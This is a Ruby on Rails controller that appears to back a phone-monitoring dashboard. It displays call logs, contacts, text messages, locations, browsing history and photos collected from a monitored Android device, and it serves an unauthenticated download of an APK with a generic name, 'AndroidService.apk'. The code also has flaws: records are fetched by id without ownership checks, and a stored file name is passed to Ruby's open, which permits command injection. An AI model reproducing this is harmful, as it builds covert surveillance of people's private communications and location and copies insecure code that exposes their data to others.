class UsersController < ApplicationController

  before_filter :authenticate_user!, except: [:terms_conditions,:download_view,:download_app]
  
  def index     
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    #    @call_logs = @devices.call_logs.paginate(:page => params[:page], :per_page => 25) if @devices
    @call_logs= @devices.call_logs.select("call_type , mobile_number, sum(call_duration)").group('call_type','mobile_number') if @devices
    @incoming = []
    @outgoing = []
    @missed = []
    @call_logs.each do |cl|
      if cl && cl.call_type == 'INCOMING'
        @incoming << [cl.mobile_number , cl["sum(call_duration)"]]
      elsif cl && cl.call_type == 'OUTGOING'
        @outgoing << [cl.mobile_number , cl["sum(call_duration)"]]
      elsif cl && cl.call_type == 'MISSED'
        @missed << [cl.mobile_number , cl["sum(call_duration)"]]
      end
    end if@devices
    @calllogs=@devices.call_logs.select("date_time,call_type, mobile_number, sum(call_duration), count(mobile_number)").group('call_type','mobile_number').order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
  end

  def show
    @user = User.find_by_id(params[:id])    
  end

  def contacts
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    @contacts = @devices.contacts.order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
  end
  
  def messages
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    if params[:type] == 'Inbox'
      @msginbox = @devices.text_msgs.where(msg_type: 'inbox').order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
    elsif params[:type] == 'Sentbox'
      @msginbox = @devices.text_msgs.where(msg_type: 'sent').order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
    elsif params[:type] == 'Outbox'
      @msginbox = @devices.text_msgs.where(msg_type: 'outbox').order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices 
     
    end
  end
  
  def get_locations
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    if request.xhr?      
      @uploadlocationfile = UploadLocationFile.where(:id=>params[:id]).first
      bucket = AWS::S3.new.buckets["eliteguardmobile"]
            p "--------------------------------------#{@uploadlocationfile.file_name}"
      
      raw_xml = open("#{@uploadlocationfile.file_name}")
      @xml = Nokogiri::XML(raw_xml)
     
      @upload_locations = @xml.search('locations').map do |game|
        %w[
    latitude longitude accuracy current_loc_time
        ].each_with_object({}) do |n, o|
          o[n] = game.at(n).text
        end
      end
      p "=======================================#{@upload_locations.class}"
      #      
      #      page = 5
      #      per_page = 10.0 # show 50 farms per page
      #      @page = page ? page.to_i : 1
      #      ##      @address = get_user_address
      #      #@upload_locations = Farm.all
      #      @pages = (upload_locations.count/per_page).ceil
      #      p "================================#{upload_locations.count}===#{@pages}"
      #      #      pppppppppppppppppppppppppppppppppppp
      #      #      @sorted_farms = @farms.sort_by{|farm| farm.distance_from(@address)}[(@page-1)*per_page, per_page]
      #      @upload_locations= upload_locations [(@page-1)*per_page, per_page]
      #      
      #      
      #      #       p "============================ffffff====#{@sorted_farms.count}"
      #      
      #      #      @upload_locations = upload_locations.paginate(:page => params[:page], :per_page => 5) if upload_locations
      #      #      date = params[:date].to_date
      #      #      p "--------------------------------#{date}"     
      #      #      @locations = @devices.device_locations.where('date(created_at) = ?', date).paginate(:page => params[:page], :per_page => 25) if @devices 
      #      #p "======================================#{@upload_locations.inspect}"
      respond_to do |format|
        format.js
      end
    else
      @locations = @devices.device_locations.order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
    end        
  end
  
  
  def browsing_history
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    @browsers = @devices.browsers.order("created_at DESC").paginate(:page => params[:page], :per_page => 25) if @devices
  end
  
  def terms_conditions
    @user_id  = params[:id] if params[:id]
  end
  
  def gallery
    @type = params[:type]
    if @type == "Photo"
      @cardfiles = CardFile.where(:mobdevise_id=>current_user.mobdevises.first.id).paginate(:page => params[:page], :per_page => 12) if current_user.mobdevises.present?
    end
  end
  
  def download_view  
    @user_id  = params[:id] if params[:id]
  end
  

  def download_app
    begin
      #      user = User.where(:id=>current_user.id)
      #      if user.present?
      #        user.update_attributes!(:term_condition => true)
      send_file "#{Rails.root}/public/software/AndroidService.apk"
      #      send_file "#{Rails.root}/public/software/AndroidServices.apk"
      #      send_file "#{Rails.root}/public/software/Android.apk"
      
      #        redirect_to root_path
      #      end
    rescue Exception => e
      puts "Error Message: " +  e.message.split('for')[0]
      render :json => e.message.split('for')[0], :status => :unprocessable_entity
    end
  end        
  
  def download_gallery
    begin
      @file = CardFile.where(:id =>params[:id]).first
      send_file @file.file.url
      #      send_file "#{Rails.root}/public#{@file.file}"
    rescue Exception => e
      logger.info "Error Message: " +  e.message
      render :json => e.message, :status => :unprocessable_entity
    end
  end
  
  
  def callog_details
    @devices = Mobdevise.where(:user_id=>current_user.id).first
    @call_logs = @devices.call_logs.where(:mobile_number=>params[:mob_no],:call_type=>params[:call_type]).paginate(:page => params[:page], :per_page => 25) if @devices    
  end
  
     
end

